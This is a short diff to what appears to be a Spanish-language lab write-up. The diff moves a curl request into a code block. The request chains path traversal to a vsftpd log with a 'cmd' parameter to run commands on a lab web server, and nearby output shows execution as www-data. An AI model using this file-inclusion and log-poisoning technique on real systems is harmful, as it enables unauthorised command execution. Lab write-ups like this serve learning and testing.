@@ -220,8 +220,8 @@ Obeserva como si procesa el comando.
 Sun Aug 16 19:58:11 2026 [pid 428] [uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 Prueba 2.
-curl "http://172.17.0.2/index.php?studio=../../../var/log/vsftpd.log&cmd=ls"
 ```bash
+curl "http://172.17.0.2/index.php?studio=../../../var/log/vsftpd.log&cmd=ls"
 <!DOCTYPE html>
 <html lang="en">
 <head>
